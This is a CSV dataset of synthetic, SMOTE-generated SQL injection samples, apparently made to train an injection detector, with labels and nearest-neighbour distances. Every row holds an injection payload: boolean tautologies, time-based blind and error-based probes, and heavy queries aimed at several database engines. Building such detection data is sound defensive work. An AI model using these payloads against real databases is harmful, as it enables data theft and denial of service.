id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000250,attack,boolean,"1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'owga' like 'owga",nearest_attack_euclidean,R000394,1.4676010074668362
SMOTE_000251,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz",nearest_attack_euclidean,R000171,0.16233896549939478
SMOTE_000252,attack,boolean,"1'   )    )     )   and elt  (  2506  =  2383,2383  )   and    (    (     (  'bjrj'  =  'bjrj",nearest_attack_euclidean,R000469,0.5698914636351579
SMOTE_000253,attack,boolean,select * from users where id  =  1 +$+. or 1  =  1 -- 1,nearest_attack_euclidean,R000005,0.04865499081074143
SMOTE_000254,attack,boolean,select * from users where id  =  1 <@<@ or 1  =  1 -- 1,nearest_attack_euclidean,R000018,0.08464835259804752
SMOTE_000255,attack,boolean,"1""  )   and 2954  =  1256--",nearest_attack_euclidean,R000496,0.0924925131286799
SMOTE_000256,attack,boolean,"1' and elt  (  3247  =  3969,3969  )   and 'xcbm' like 'xcbm",nearest_attack_euclidean,R000511,0.34368422126563575
SMOTE_000257,attack,boolean,-3088' or 6872  =  6872 and 'miwk'  =  'miwk,nearest_attack_euclidean,R000108,0.0759906948883179
SMOTE_000258,attack,boolean,"1%""   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000121,0.7742654816974033
SMOTE_000259,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000563,0.43318843105452143
SMOTE_000260,attack,boolean,"1   )    )    as rual where 4649  =  4649 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000265,0.063448183385238
SMOTE_000261,attack,boolean,"1'   )    )     )   and elt  (  2506  =  2383,2383  )   and    (    (     (  'bjrj'  =  'bjrj",nearest_attack_euclidean,R000469,0.5294513180771724
SMOTE_000262,attack,boolean,"-8319""   )    )    or 7878  =  5970 and    (    (   ""jcaz"" like ""jcaz",nearest_attack_euclidean,R000235,0.005523830848320713
SMOTE_000263,attack,boolean,-9771' or 5113  =  5365,nearest_attack_euclidean,R000595,1.6420926162137603
SMOTE_000264,attack,boolean,"1' in boolean mode  )   and elt  (  4249  =  4249,7259  )  #",nearest_attack_euclidean,R000204,0.5308225869192368
SMOTE_000265,attack,boolean,"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000759,0.2264655472960665
SMOTE_000266,attack,boolean,1   )    )    as tnhy where 1874  =  1874 and 2858  =  7324#,nearest_attack_euclidean,R000175,0.029179176588438948
SMOTE_000267,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000081,0.023509049448913605
SMOTE_000268,attack,boolean,"1'  )   as rvch where 1863  =  1863 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000061,0.35640125887326385
SMOTE_000269,attack,boolean,-4684  )   as uqjn where 4550  =  4550 or 1689  =  5825,nearest_attack_euclidean,R000273,0.13254806353468687
SMOTE_000270,attack,boolean,"1  )   where 9469  =  9469 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000639,0.9176445160155121
SMOTE_000271,attack,boolean,"1' in boolean mode  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000690,0.4902306572255103
SMOTE_000272,attack,boolean,-8710 or 9323  =  9323#,nearest_attack_euclidean,R000473,0.4347072136113418
SMOTE_000273,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000024,9.09606806605773
SMOTE_000274,attack,boolean,"1""  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""gcnq"" like ""gcnq",nearest_attack_euclidean,R000481,1.4594428301067262
SMOTE_000275,attack,boolean,1  )   and   (  2342  =  3620  )  *3620,nearest_attack_euclidean,R000510,0.19910795302236708
SMOTE_000276,attack,boolean,"-2448%""  )   or 3038  =  3038",nearest_attack_euclidean,R000168,0.05761417256623572
SMOTE_000277,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000352,0.9021052757097605
SMOTE_000278,attack,boolean,1' where 9816  =  9816 and 7533  =  7533--,nearest_attack_euclidean,R000425,0.11569191347676407
SMOTE_000279,attack,boolean,"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000769,0.30647004900420566
SMOTE_000280,attack,boolean,"-1203""   )    )    or 8571  =  8571--",nearest_attack_euclidean,R000439,0.02653995787570235
SMOTE_000281,attack,boolean,-8710 or 9323  =  9323#,nearest_attack_euclidean,R000473,0.6990682193624016
SMOTE_000282,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'atyf'  =  'atyf",nearest_attack_euclidean,R000594,0.19448137263758739
SMOTE_000283,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000409,0.1120045415946211
SMOTE_000284,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000177,1.2871105846167608
SMOTE_000285,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'xlvt'  =  'xlvt",nearest_attack_euclidean,R000282,0.49540748306958854
SMOTE_000286,attack,boolean,"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""czvm"" like ""czvm",nearest_attack_euclidean,R000207,0.42154735972040486
SMOTE_000287,attack,boolean,1'  )   and 2564  =  3234--,nearest_attack_euclidean,R000626,1.2838541995803865
SMOTE_000288,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000301,0.7458142125867339
SMOTE_000289,attack,boolean,"1""  )   and 7533  =  7533 and   (  ""jfsw"" like ""jfsw",nearest_attack_euclidean,R000431,1.5023131795999394
SMOTE_000290,attack,boolean,-6030%'  )   or 3038  =  3038,nearest_attack_euclidean,R000174,0.1856056469256934
SMOTE_000291,attack,boolean,"-5027%""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000530,1.8997111479095206
SMOTE_000292,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000497,0.3296011299449915
SMOTE_000293,attack,boolean,"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000617,1.1149488518387465
SMOTE_000294,attack,boolean,end and '%'  =  ',nearest_attack_euclidean,R000579,1.133384785605849
SMOTE_000295,attack,boolean,"1   )    )    and make_set  (  8554  =  3286,3286  )   and    (    (   7385  =  7385",nearest_attack_euclidean,R000313,0.10824180563564217
SMOTE_000296,attack,boolean,1  )   as mtnw where 7293  =  7293 and 2603  =  5764--,nearest_attack_euclidean,R000697,1.3514547054945243
SMOTE_000297,attack,boolean,end and   (  'nchh'  =  'nchh,nearest_attack_euclidean,R000233,0.5171975427238404
SMOTE_000298,attack,boolean,"1' where 1031  =  1031 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000202,0.10822824804890052
SMOTE_000299,attack,boolean,"1%""   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000708,0.9404007558583559
SMOTE_000300,attack,boolean,"1%""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000716,1.2081047696974678
SMOTE_000301,attack,boolean,"1""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""dbxi"" like ""dbxi",nearest_attack_euclidean,R000635,0.29530557434889065
SMOTE_000302,attack,boolean,"1'  )   where 8348  =  8348 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R000627,0.00233670315315172
SMOTE_000303,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000345,0.18334481243274833
SMOTE_000304,attack,boolean,"1%'   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000329,1.3277060339868565
SMOTE_000305,attack,boolean,"1""  )   and 7533  =  7533 and   (  ""jfsw"" like ""jfsw",nearest_attack_euclidean,R000431,0.5100593688284883
SMOTE_000306,attack,boolean,1  )   as mtnw where 7293  =  7293 and 2603  =  5764--,nearest_attack_euclidean,R000697,0.9094770788868165
SMOTE_000307,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000444,0.173185079729499
SMOTE_000308,attack,boolean,"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""jebr"" like ""jebr",nearest_attack_euclidean,R000520,1.7742024093124782
SMOTE_000309,attack,boolean,"1   )    )    as aeat where 1007  =  1007 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000145,0.32755411081478747
SMOTE_000310,attack,boolean,1   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  1233  =  1233,nearest_attack_euclidean,R000656,0.7409194779233462
SMOTE_000311,attack,boolean,"1'||  (  select 'uyfo' where 1236  =  1236 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000343,0.28133043113805023
SMOTE_000312,attack,boolean,"1""  )   where 2873  =  2873 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000654,0.0986306754855409
SMOTE_000313,attack,boolean,"1"" and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",nearest_attack_euclidean,R000219,0.4115773230106806
SMOTE_000314,attack,boolean,"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'ywxc'  =  'ywxc",nearest_attack_euclidean,R000452,1.4212148167386331
SMOTE_000315,attack,boolean,"1""  )   where 8254  =  8254 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000398,0.488946908014336
SMOTE_000316,attack,boolean," select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000016,0.15249079058853118
SMOTE_000317,attack,boolean,"-6971"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""ifuh"" like ""ifuh",nearest_attack_euclidean,R000419,0.7298771428261227
SMOTE_000318,attack,boolean,"1 and elt  (  3172  =  7243,7243  )  ",nearest_attack_euclidean,R000705,0.014044562718164661
SMOTE_000319,attack,boolean,"1'+  (  select ouhd where 8905  =  8905 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",nearest_attack_euclidean,R000278,0.6330854734991547
SMOTE_000320,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'gzlz' like 'gzlz",nearest_attack_euclidean,R000581,0.7390328269393077
SMOTE_000321,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'qfwc'  =  'qfwc",nearest_attack_euclidean,R000772,1.198449085381285
SMOTE_000322,attack,boolean,"-1055"" or   (  8459  =  8459  )  *4906 and ""kdbr""  =  ""kdbr",nearest_attack_euclidean,R000123,0.27892105660875205
SMOTE_000323,attack,boolean,"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000341,0.06322292064902486
SMOTE_000324,attack,boolean,"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""uqyb""  =  ""uqyb",nearest_attack_euclidean,R000741,0.6100164079097219
SMOTE_000325,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000667,0.08440530447061537
SMOTE_000326,attack,boolean,"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'rspz'  =  'rspz",nearest_attack_euclidean,R000196,1.8676282580137629
SMOTE_000327,attack,boolean,"1' in boolean mode  )   and elt  (  4249  =  4249,7259  )  #",nearest_attack_euclidean,R000204,0.45483485919162303
SMOTE_000328,attack,boolean,-6030%'  )   or 3038  =  3038,nearest_attack_euclidean,R000174,0.6866669031829534
SMOTE_000329,attack,boolean,"1'||  (  select 'eamo' where 4958  =  4958 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   ||'",nearest_attack_euclidean,R000589,0.1620300676861588
SMOTE_000330,attack,boolean,"1   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   5683  =  5683",nearest_attack_euclidean,R000657,0.31718593899388664
SMOTE_000331,attack,boolean,"1%' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",nearest_attack_euclidean,R000518,0.06483176990409151
SMOTE_000332,attack,boolean,"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'jmub'  =  'jmub",nearest_attack_euclidean,R000718,0.09931424587752044
SMOTE_000333,attack,boolean,"1'   )    )    as prxm where 1267  =  1267 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000194,0.7313899436521425
SMOTE_000334,attack,boolean,"-4462%""  )   or 8571  =  8571--",nearest_attack_euclidean,R000395,2.443699609799821
SMOTE_000335,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'xiyl' like 'xiyl",nearest_attack_euclidean,R000296,1.8484129354258056
SMOTE_000336,attack,boolean,1   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  1233  =  1233,nearest_attack_euclidean,R000656,0.8085966718319079
SMOTE_000337,attack,boolean,"-6629%""   )    )     )   or 8571  =  8571--",nearest_attack_euclidean,R000544,0.29213942052879877
SMOTE_000338,attack,boolean,-7786'   )    )    or 9323  =  9323#,nearest_attack_euclidean,R000173,0.29458953077621164
SMOTE_000339,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  1105  =  1105",nearest_attack_euclidean,R000239,0.2217495468174858
SMOTE_000340,attack,boolean,-3339' or 8571  =  8571--,nearest_attack_euclidean,R000386,0.4391856677653724
SMOTE_000341,attack,boolean,-7021' or 3038  =  3038,nearest_attack_euclidean,R000138,0.9446346818596698
SMOTE_000342,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000706,0.7937724421183194
SMOTE_000343,attack,boolean,"1%""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000286,1.44040929408374
SMOTE_000344,attack,boolean,"1' and make_set  (  8403  =  8403,8899  )   and 'fttd' like 'fttd",nearest_attack_euclidean,R000347,0.04562619362326603
SMOTE_000345,attack,boolean,"-2149""   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  ""hoon"" like ""hoon",nearest_attack_euclidean,R000743,0.6561903515716173
SMOTE_000346,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""vwep"" like ""vwep",nearest_attack_euclidean,R000292,0.10488233731946835
SMOTE_000347,attack,boolean,1   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  1233  =  1233,nearest_attack_euclidean,R000656,0.5031456974957074
SMOTE_000348,attack,boolean,"-2726""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""ococ""  =  ""ococ",nearest_attack_euclidean,R000212,0.7734249486591344
SMOTE_000349,attack,boolean,end and '%'  =  ',nearest_attack_euclidean,R000579,1.7334991453898647
SMOTE_000350,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000345,0.004331216130754901
SMOTE_000351,attack,boolean,"1%'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000577,1.3055026545093733
SMOTE_000352,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""ekbq""  =  ""ekbq",nearest_attack_euclidean,R000489,0.09554648381702213
SMOTE_000353,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000008,0.018919809094268023
SMOTE_000354,attack,boolean,"1%""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000097,1.1482195513242275
SMOTE_000355,attack,boolean,"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000731,1.3495122400061592
SMOTE_000356,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  4537  =  4537",nearest_attack_euclidean,R000399,0.7419411834044028
SMOTE_000357,attack,boolean,or 1  =  1 or ''  =  ',nearest_attack_euclidean,R000007,0.5608473282532859
SMOTE_000358,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000612,1.130904278955271
SMOTE_000359,attack,boolean,select * from users where id  =  1 <@$_ or 1  =  1 -- 1,nearest_attack_euclidean,R000036,0.25633738534148603
SMOTE_000360,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000224,0.8158069910990271
SMOTE_000361,attack,boolean, or 'something' like 'some%',nearest_attack_euclidean,R000032,2.4002778139387444
SMOTE_000362,attack,boolean,-4313%'  )   or 6872  =  6872 and   (  '%'  =  ',nearest_attack_euclidean,R000525,0.9681423553125297
SMOTE_000363,attack,boolean,"1'+  (  select sshu where 3442  =  3442 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",nearest_attack_euclidean,R000382,1.561668132381329
SMOTE_000364,attack,boolean,"-1043""  )   where 4207  =  4207 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000770,0.3593273249412661
SMOTE_000365,attack,boolean,"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R000582,0.8390029861671591
SMOTE_000366,attack,boolean,"1""  )   where 4660  =  4660 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000268,0.33292464065032745
SMOTE_000367,attack,boolean,"1   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  7484  =  7484",nearest_attack_euclidean,R000135,0.8266343387373053
SMOTE_000368,attack,boolean,"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000759,0.2183585066739502
SMOTE_000369,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R000364,0.5085584885192834
SMOTE_000370,attack,boolean,-7773' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,nearest_attack_euclidean,R000775,1.1222565217856577
SMOTE_000371,attack,boolean,"-1072%""   )    )    or 3090  =  3539",nearest_attack_euclidean,R000350,0.17685211477100163
SMOTE_000372,attack,boolean,"-6971"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""ifuh"" like ""ifuh",nearest_attack_euclidean,R000419,0.21929965591949568
SMOTE_000373,attack,boolean,"1"" where 4082  =  4082 and elt  (  5699  =  1432,1432  )  --",nearest_attack_euclidean,R000459,0.42630716316846834
SMOTE_000374,attack,boolean,"1   )    )    as rual where 4649  =  4649 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000265,0.31878779803692936
SMOTE_000375,attack,boolean,‘ or 3  =  3 --,nearest_attack_euclidean,R000022,0.05855425428052957
SMOTE_000376,attack,boolean,"1""   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""vcjt"" like ""vcjt",nearest_attack_euclidean,R000130,1.0636968334125296
SMOTE_000377,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""--",nearest_attack_euclidean,R000010,2.2318499442329305
SMOTE_000378,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000234,0.06034312740479187
